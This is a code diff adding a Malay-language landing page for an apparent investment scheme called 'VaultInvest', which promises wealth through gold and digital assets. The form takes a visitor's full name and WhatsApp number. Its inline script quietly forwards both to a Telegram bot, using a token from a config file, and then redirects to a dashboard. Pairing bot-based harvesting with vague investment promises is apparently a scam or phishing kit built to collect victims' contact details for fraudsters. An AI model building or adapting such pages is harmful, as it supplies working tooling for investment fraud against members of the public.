@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VaultInvest — Masa Depan Pelaburan</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <div class="card">
+        <h1>Pelaburan Pintar.</h1>
+        <p class="subtitle">Sertai 15,000+ rakyat Malaysia yang membina kekayaan dengan portfolio emas dan aset digital.</p>
+        <form id="form1">
+            <div class="input-group">
+                <label>Nama Penuh</label>
+                <input type="text" id="name" placeholder="Ali Bin Abu" required>
+            </div>
+            <div class="input-group">
+                <label>No. Telefon (WhatsApp)</label>
+                <input type="tel" id="phone" placeholder="0123456789" required>
+            </div>
+            <button type="submit" id="btn">Buka Akaun Percuma</button>
+        </form>
+    </div>
+    
+    <script src="js/config.js"></script>
+    <script>
+        document.getElementById('form1').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('btn');
+            btn.textContent = "Menyediakan...";
+            const name = document.getElementById('name').value;
+            const phone = document.getElementById('phone').value;
+            
+            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: "POST", body: new URLSearchParams({ chat_id: CONFIG.CHAT_ID, text: `💎 Pelabur Baru!\nNama: ${name}\nNo HP: ${phone}`, parse_mode: "HTML" })
+            });
+            
+            localStorage.setItem('investor_name', name);
+            window.location.href = "dashboard.html";
+        });
+    </script>
+</body>
+</html>
